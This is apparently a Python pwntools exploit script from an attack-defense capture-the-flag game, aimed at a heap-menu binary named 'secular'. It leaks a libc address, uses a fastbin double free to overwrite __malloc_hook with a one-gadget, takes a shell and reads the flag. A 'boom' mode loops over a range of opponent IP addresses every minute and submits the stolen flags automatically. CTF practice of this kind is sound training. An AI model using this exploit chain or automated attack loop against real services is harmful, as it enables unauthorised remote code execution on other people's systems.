#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from submit import submit_flag
from time import sleep
import threading
import os
from team import team

PREFIX = '172.16.5.'
TIMEOUT = 5 #TODO
DELAY = 60
LIST = range(10, 35) # victim pool
ME = 12
PORT = 5055

context.arch = 'amd64'
elf=ELF('./challs/secular')
libc=ELF("./libc.so.6")
libc_add=0

def exploit(conn, trash=False):
    def add(length,name,luck):
        conn.sendlineafter("Your Choice :","1")
        conn.sendlineafter("Input Length of Name:\n",str(length))
        conn.sendafter("Input Your Name:",name)
        conn.sendlineafter("Input Your Luckynumber:",str(luck))

    def show(idx):
        conn.sendlineafter("Your Choice :","2")
        conn.sendlineafter("Input Index:\n",str(idx))
        conn.recvuntil("The Content is ")
        return conn.recvline(keepends=False)

    def dele(idx):
        conn.sendlineafter("Your Choice :","3")
        conn.sendlineafter("Input Index:",str(idx))

    def magic(luck):
        conn.sendlineafter("Your Choice :","4")
        conn.sendlineafter("Input Your Magic Number:\n",str(luck))
    add(0xa0,"a"*0xa0,1)#0
    add(0xa0,"a"*0xa0,1)#1
    dele(0)
    add(0x80,"a"*0x8,1)#2
    libc_add=u64(show(2)[8:].ljust(8,"\x00"))-0x3c4b78
    add(0x60,"a",1)#3
    add(0x60,"a",1)#4
    add(0x10,"a",1)#5
    dele(3)
    dele(4)
    dele(3)
    add(0x60,p64(libc_add+libc.symbols["__malloc_hook"]-19),1)
    if trash:
        add(0x70,"a",1)
        conn.close()
        return ''
    add(0x60,"a",1)
    add(0x60,"a",1)
    gadget=[0xf1147,0xf02a4,0x4526a,0x45216]
    add(0x60,"a"*3+p64(libc_add+gadget[1]),1)
    dele(2)
    dele(2)
    conn.clean(0.1)
    if len(sys.argv) > 2:
        conn.interactive()
        return
    conn.sendline('cat flag')
    flag = conn.clean(0.1)
    conn.close()
    return flag

def boom():
    while True:
        for i in LIST:
            if i == ME:
                continue
            ip = PREFIX + str(i)
            print 'pwning %s' % ip
            try:
                flag = exploit(remote(ip, PORT, timeout=TIMEOUT,), trash=False)
                submit_flag(flag)
                success('pwned: %s %s' % (ip, team[ip]))
            except:
                warning('failed: %s %s' % (ip, team[ip]))
            #for j in range(10):
            #    exploit(remote(ip, PORT, timeout=TIMEOUT,), trash=True)
        sleep(DELAY)

if len(sys.argv) > 2: # attack one
    context.log_level = 'debug'
    submit_flag(exploit(remote(sys.argv[1], sys.argv[2], timeout=TIMEOUT)))
elif len(sys.argv) > 1:
    if sys.argv[1] == 'boom': # pwning all
        context.log_level = 'info'
        boom()
    else: # debug
        libc = ELF('/home/hdt/ldlibc/libc-2.24.dbg')
        os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
        exploit(code.process())
        #r = remote('127.0.0.1', 4444)
else: # local
    libc = code.libc
    exploit(code.process())

